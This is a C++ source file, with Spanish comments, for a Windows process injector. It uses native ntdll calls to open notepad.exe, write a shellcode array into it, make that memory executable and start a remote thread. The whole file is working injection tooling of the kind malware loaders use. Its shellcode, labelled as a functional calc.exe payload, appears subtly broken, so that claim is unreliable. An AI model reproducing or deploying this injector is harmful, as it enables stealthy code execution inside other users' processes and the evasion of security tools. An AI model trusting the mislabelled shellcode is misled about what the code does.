#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

// Prototipos corregidos para x64
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

DWORD GetTargetPID(const char* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    // Shellcode funcional para calc.exe (x64)
    unsigned char shellcode[] = {
        0x48, 0x83, 0xEC, 0x28, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9,
        0x48, 0xB8, 0x3C, 0x77, 0x69, 0x6E, 0x63, 0x61, 0x6C, 0x63, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48,
        0x8D, 0x44, 0x24, 0x20, 0x48, 0x31, 0xC9, 0x48, 0x89, 0xC2, 0x4D, 0x31, 0xC0, 0x48, 0x83, 0xC0,
        0x3C, 0x48, 0x89, 0xC1, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0x54, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x28,
        0xC3
    };

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[-] Error al obtener handle de ntdll.dll" << std::endl;
        return -1;
    }

    // Obtener direcciones de las funciones
    auto NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    auto NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    auto NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    auto NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    auto NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtOpenProcess || !NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx) {
        std::cerr << "[-] Error al resolver funciones NT" << std::endl;
        return -1;
    }

    DWORD pid = GetTargetPID("notepad.exe");
    if (!pid) {
        std::cerr << "[-] No se pudo encontrar notepad.exe" << std::endl;
        return -1;
    }

    HANDLE hProcess = nullptr;
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID ci = { (HANDLE)(ULONG_PTR)pid, nullptr };

    NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] NtOpenProcess falló (0x" << std::hex << status << ")" << std::endl;
        return -1;
    }

    PVOID remoteMem = nullptr;
    SIZE_T memSize = sizeof(shellcode);
    status = NtAllocateVirtualMemory(hProcess, &remoteMem, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] NtAllocateVirtualMemory falló (0x" << std::hex << status << ")" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    status = NtWriteVirtualMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), nullptr);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] NtWriteVirtualMemory falló (0x" << std::hex << status << ")" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    ULONG oldProtect;
    status = NtProtectVirtualMemory(hProcess, &remoteMem, &memSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] NtProtectVirtualMemory falló (0x" << std::hex << status << ")" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = nullptr;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProcess, remoteMem, nullptr, 0, 0, 0, 0, nullptr);
    if (!NT_SUCCESS(status)) {
        std::cerr << "[-] NtCreateThreadEx falló (0x" << std::hex << status << ")" << std::endl;
        CloseHandle(hProcess);
        return -1;
    }

    std::cout << "[+] Inyección exitosa!" << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}